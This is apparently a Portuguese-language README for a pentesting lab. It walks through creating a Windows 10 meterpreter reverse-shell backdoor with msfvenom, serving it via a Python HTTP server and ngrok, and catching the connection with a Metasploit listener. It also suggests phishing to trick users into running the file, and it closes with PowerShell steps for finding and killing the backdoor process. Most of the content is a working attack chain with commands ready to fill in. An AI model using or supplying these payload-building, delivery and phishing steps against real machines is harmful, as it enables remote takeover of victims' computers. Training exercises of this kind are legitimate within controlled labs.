# **Pentesting Lab: Criação e Remoção de Backdoor em uma VM Windows 10**

Este repositório contém um laboratório prático de pentesting onde mostramos como criar e remover uma **backdoor** em uma máquina virtual com **Windows 10**. O objetivo desse exercício é demonstrar uma técnica de exploração e como limpar os vestígios após um ataque, para fins educacionais e de segurança cibernética.

## **Pré-requisitos**

Antes de começar, é necessário ter as seguintes ferramentas instaladas:

- **Kali Linux** ou outro sistema Linux com **Metasploit Framework** instalado.
- **Máquina Virtual com Windows 10** (pode ser usando VirtualBox ou VMware).
- **Metasploit Framework** (msfvenom e msfconsole).
- **Python 3.x** para criar o servidor HTTP (alternativamente, pode-se usar outras opções de servidor).
- **PowerShell** ou **Prompt de Comando** no Windows 10 para a execução de comandos.

## **Passo a Passo**

### **1. Criando a Backdoor com o msfvenom**

A primeira etapa é gerar um **payload** malicioso usando a ferramenta **msfvenom** do Metasploit.

1. Abra o terminal do Kali Linux.
2. Execute o seguinte comando para gerar um payload que irá abrir uma **conexão reversa**:
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<SEU_IP> LPORT=<PORTA> -f exe > (nome da backdoor).exe
  - Substitua <SEU_IP> pelo seu IP local (onde você vai receber a conexão reversa).

  - Substitua <PORTA> por uma porta de sua escolha (exemplo: 4444).

### **2. Criando um Servidor HTTP para Enviar o Payload**

Agora, vamos criar um servidor HTTP simples em Python para enviar o payload gerado para a máquina vítima.

1. No Kali Linux, abra o terminal e navegue até o diretório onde o payload (`backdoor.exe`) está localizado.

2. Execute o seguinte comando para iniciar o servidor HTTP:

   ```bash
   python3 -m http.server 8000
- Isso vai disponibilizar o arquivo backdoor.exe para a vítima através do endereço http://<SEU_IP>:8000/backdoor.exe.
### **3. Configurando o Listener no Metasploit**

Agora, vamos configurar o Metasploit para ouvir a conexão reversa da máquina Windows 10.

1. Abra o terminal no Kali Linux e inicie o `msfconsole`:

   ```bash
   msfconsole
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST <SEU_IP>
   set LPORT <PORTA>
   run
- Substitua <SEU_IP> e <PORTA> pelos valores correspondentes.
  
O Metasploit agora está esperando pela conexão da máquina vítima.

### **4. Enviando o Payload para a Máquina Vítima**

Uma alternativa para o servidor HTTP é o uso do **ngrok**, que cria um túnel para o seu servidor local e disponibiliza a URL pública que pode ser acessada de qualquer lugar.

#### Usando o ngrok para Enviar o Payload:

1. Se ainda não tiver o **ngrok** instalado, faça o download no [site oficial](https://ngrok.com/download) e siga as instruções para instalação.
   
2. Inicie um servidor HTTP local no Kali Linux, como já foi mencionado anteriormente:

   ```bash
   python3 -m http.server 8000
3. Abra outro terminal e inicie o ngrok para expor a porta 8000 do seu servidor local:
     ```bash
     ngrok http 8000
- O ngrok irá gerar uma URL pública, como por exemplo:
    ```bash
    http://<SEU_NGROK_URL>.ngrok.io
> **Phishing e Envio do Payload**

> Uma técnica comum de distribuição de payloads maliciosos é o **phishing**.  
> Em vez de enviar diretamente o link do servidor, o atacante pode enviar um e-mail ou mensagem falsa contendo um **link ou anexo** que, ao ser clicado, faz o download do payload malicioso.
> Essa técnica visa **enganar o usuário** e induzi-lo a **executar o arquivo malicioso**, concedendo assim acesso remoto ao atacante.

4. Na máquina virtual com Windows 10, faça o download do backdoor.exe utilizando o navegador e acesse a URL gerada pelo ngrok:
   ```text
   http://<SEU_NGROK_URL>.ngrok.io/backdoor.exe
### **5. Identificando e Removendo a Backdoor**
Após ter acesso à máquina vítima, o próximo passo é identificar o arquivo malicioso e removê-lo.

1. Abra o PowerShell ou Prompt de Comando no Windows 10.
2. Use o comando para listar os processos em execução:
   ```bash
   netstat -anob
3. Identificar o processo malicioso
Se você já sabe o nome do executável (ex: backdoor.exe), execute:
    ```bash
    Get-Process | Where-Object { $_.Name -like "*backdoor*" }
4. Finalizar o processo
    ```bash
    Stop-Process -Name "backdoor" -Force
5. Verificar e remover persistência
Alguns malwares se autoexecutam via inicialização ou tarefas agendadas.
  🔧 Inicialização:
    ```bash
    Get-CimInstance Win32_StartupCommand | Select-Object Name, Command
 


### **Notas Importantes:**
1. **Substitua `<SEU_IP>` e `<PORTA>`** nos comandos pelos valores corretos, como seu **IP local** e a porta que você está usando.
2. **Certifique-se de que todo o trabalho é feito em ambientes controlados** (como uma máquina virtual), e que seu uso seja ético e legal.

### Como Usar:
- Copie e cole este conteúdo no seu repositório do GitHub na seção de README.
- **Faça alterações personalizadas** conforme necessário, principalmente se houver algo específico no seu processo que precise de ajustes.


  

    
    





   
